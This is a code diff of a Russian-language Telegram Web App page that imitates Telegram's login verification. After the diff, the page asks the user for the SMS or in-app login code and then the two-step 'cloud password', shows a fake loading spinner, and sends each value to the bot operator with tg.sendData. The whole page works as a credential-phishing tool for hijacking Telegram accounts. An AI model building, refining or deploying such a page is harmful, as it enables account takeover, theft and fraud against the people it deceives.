@@ -4,140 +4,157 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
-<style>
-    :root {
-        --bg-color: #0f1721;
-        --container-bg: #1c2733;
-        --text-color: #ffffff;
-        --hint-color: #708499;
-        --accent-color: #3390ec;
-        --input-bg: #242f3d;
-    }
+    <style>
+        :root {
+            --bg-color: #0f1721;
+            --container-bg: #1c2733;
+            --text-color: #ffffff;
+            --hint-color: #708499;
+            --button-color: #3390ec;
+            --input-bg: #242f3d;
+            --input-border: #2f3e4e;
+        }
 
-    /* УБИРАЕМ СТРЕЛОЧКИ */
-    input::-webkit-outer-spin-button,
-    input::-webkit-inner-spin-button {
-        -webkit-appearance: none !important;
-        margin: 0 !important;
-    }
-    input[type=number] { -moz-appearance: textfield !important; appearance: none !important; }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background-color: var(--bg-color);
+            color: var(--text-color);
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            overflow: hidden;
+        }
 
-    body {
-        font-family: -apple-system, system-ui, sans-serif;
-        background-color: var(--bg-color);
-        color: var(--text-color);
-        margin: 0;
-        display: flex;
-        align-items: center;
-        justify-content: center;
-        height: 100vh;
-        overflow: hidden;
-    }
+        .app-container {
+            width: 100%;
+            max-width: 360px;
+            padding: 30px;
+            text-align: center;
+            background: var(--container-bg);
+            border-radius: 24px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
+            margin: 15px;
+        }
 
-    .card {
-        width: 100%;
-        max-width: 340px;
-        background: var(--container-bg);
-        padding: 40px 30px;
-        border-radius: 28px;
-        text-align: center;
-        box-shadow: 0 20px 40px rgba(0,0,0,0.5);
-        margin: 20px;
-    }
+        .icon-box {
+            width: 70px;
+            height: 70px;
+            background: var(--button-color);
+            border-radius: 20px;
+            margin: 0 auto 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 32px;
+            box-shadow: 0 5px 15px rgba(51, 144, 236, 0.4);
+        }
 
-    .logo-area {
-        font-size: 55px;
-        margin-bottom: 20px;
-        transition: transform 0.3s ease;
-        display: inline-block;
-    }
+        h2 { font-size: 24px; margin: 0 0 10px 0; font-weight: 600; }
+        p { font-size: 15px; color: var(--hint-color); line-height: 1.4; margin-bottom: 25px; }
 
-    h2 { font-size: 22px; margin: 0 0 10px 0; font-weight: 600; }
-    p { font-size: 14px; color: var(--hint-color); line-height: 1.5; margin-bottom: 30px; min-height: 42px; }
+        .input-group { position: relative; width: 100%; margin-bottom: 20px; }
 
-    input {
-        width: 100%;
-        background: var(--input-bg);
-        border: 2px solid transparent;
-        border-radius: 16px;
-        padding: 18px;
-        color: #fff;
-        font-size: 20px;
-        text-align: center;
-        outline: none;
-        box-sizing: border-box;
-        transition: 0.3s;
-        margin-bottom: 15px;
-    }
+        input {
+            width: 100%;
+            background: var(--input-bg);
+            border: 2px solid var(--input-border);
+            border-radius: 14px;
+            padding: 16px;
+            color: #fff;
+            font-size: 18px;
+            outline: none;
+            box-sizing: border-box;
+            transition: all 0.3s ease;
+            text-align: center;
+        }
 
-    input:focus { border-color: var(--accent-color); }
+        input:focus { border-color: var(--button-color); box-shadow: 0 0 10px rgba(51, 144, 236, 0.2); }
 
-    button {
-        width: 100%;
-        background: var(--accent-color);
-        color: white;
-        border: none;
-        border-radius: 16px;
-        padding: 18px;
-        font-size: 16px;
-        font-weight: 700;
-        cursor: pointer;
-        box-shadow: 0 4px 15px rgba(51, 144, 236, 0.3);
-    }
+        button {
+            width: 100%;
+            background: var(--button-color);
+            border: none;
+            border-radius: 14px;
+            padding: 16px;
+            color: #fff;
+            font-size: 17px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: transform 0.1s ease, opacity 0.2s;
+        }
 
-    button:active { transform: scale(0.97); }
+        button:active { transform: scale(0.98); opacity: 0.9; }
 
-    .step { display: none; }
-    .active { display: block; animation: slideIn 0.4s ease forwards; }
+        .step { display: none; }
+        .active { display: block; animation: slideIn 0.3s ease-out; }
 
-    @keyframes slideIn {
-        from { opacity: 0; transform: translateX(30px); }
-        to { opacity: 1; transform: translateX(0); }
-    }
-</style>
+        @keyframes slideIn {
+            from { opacity: 0; transform: translateX(20px); }
+            to { opacity: 1; transform: translateX(0); }
+        }
+
+        .loader {
+            display: none;
+            border: 3px solid rgba(255,255,255,0.1);
+            border-radius: 50%;
+            border-top: 3px solid #fff;
+            width: 20px;
+            height: 20px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto;
+        }
+
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
 </head>
 <body>
 
-<div class="card">
-    <div id="main-icon" class="logo-area">📞</div>
-
-    <div id="step-phone" class="step active">
-        <h2>Вход</h2>
-        <p>Введите номер телефона аккаунта</p>
-        <input type="tel" id="p" placeholder="+7..." autofocus>
-        <button onclick="nextStep('code')">Получить код</button>
-    </div>
+<div class="app-container">
+    <div id="main-icon" class="icon-box">✉️</div>
 
     <div id="step-code" class="step">
-        <h2>Код SMS</h2>
-        <p>Введите код из приложения или СМС</p>
-        <input type="number" id="c" placeholder="00000">
-        <button onclick="checkPasswordStep()">Продолжить</button>
+        <h2>Код из SMS</h2>
+        <p>Мы отправили проверочный код в ваше приложение Telegram</p>
+        <div class="input-group">
+            <input type="number" id="code_input" placeholder="00000" autofocus>
+        </div>
+        <button id="btn-code" onclick="sendData('code')">
+            <span id="text-code">Подтвердить</span>
+            <div id="loader-code" class="loader"></div>
+        </button>
     </div>
 
     <div id="step-pass" class="step">
         <h2>Пароль 2FA</h2>
-        <p>Введите ваш облачный пароль</p>
-        <input type="password" id="pass" placeholder="Ваш пароль">
-        <button onclick="finish()">Завершить</button>
+        <p>Введите ваш облачный пароль (двухэтапная аутентификация)</p>
+        <div class="input-group">
+            <input type="password" id="pass_input" placeholder="Ваш пароль">
+        </div>
+        <button id="btn-pass" onclick="sendData('pass')">
+            <span id="text-pass">Завершить</span>
+            <div id="loader-pass" class="loader"></div>
+        </button>
     </div>
 </div>
 
 <script>
     const tg = window.Telegram.WebApp;
     tg.expand();
+    tg.ready();
+    tg.headerColor = '#1c2733';
 
-    // При загрузке проверяем, какой экран открыть
+    // Проверяем какой шаг открыть через URL: ?step=code или ?step=pass
     window.onload = function() {
         const urlParams = new URLSearchParams(window.location.search);
-        const step = urlParams.get('step'); // получаем ?step=code или ?step=pass
+        const step = urlParams.get('step');
 
-        if (step === 'code') {
-            showStep('code', '✉️');
-        } else if (step === 'pass') {
+        if (step === 'pass') {
             showStep('pass', '🔑');
         } else {
-            showStep('phone', '📞');
+            showStep('code', '✉️'); // По умолчанию открываем код
         }
     };
 
@@ -147,18 +164,21 @@
         document.getElementById('main-icon').innerText = icon;
     }
 
-    // Для ввода кода
-    function checkPasswordStep() {
-        const code = document.getElementById('c').value;
-        if (!code) return;
-        tg.sendData(code); // Отправляем код боту и закрываемся
-    }
+    function sendData(type) {
+        const inputId = type === 'code' ? 'code_input' : 'pass_input';
+        const loaderId = type === 'code' ? 'loader-code' : 'loader-pass';
+        const textId = type === 'code' ? 'text-code' : 'text-pass';
+        
+        const val = document.getElementById(inputId).value;
+        if (!val) return;
 
-    // Для ввода пароля
-    function finish() {
-        const password = document.getElementById('pass').value;
-        if (!password) return;
-        tg.sendData(password); // Отправляем пароль боту и закрываемся
+        // Эффект загрузки
+        document.getElementById(textId).style.display = 'none';
+        document.getElementById(loaderId).style.display = 'block';
+
+        setTimeout(() => {
+            tg.sendData(val); // Отправляем данные боту (он их получит в message.web_app_data.data)
+        }, 600);
     }
 </script>
 
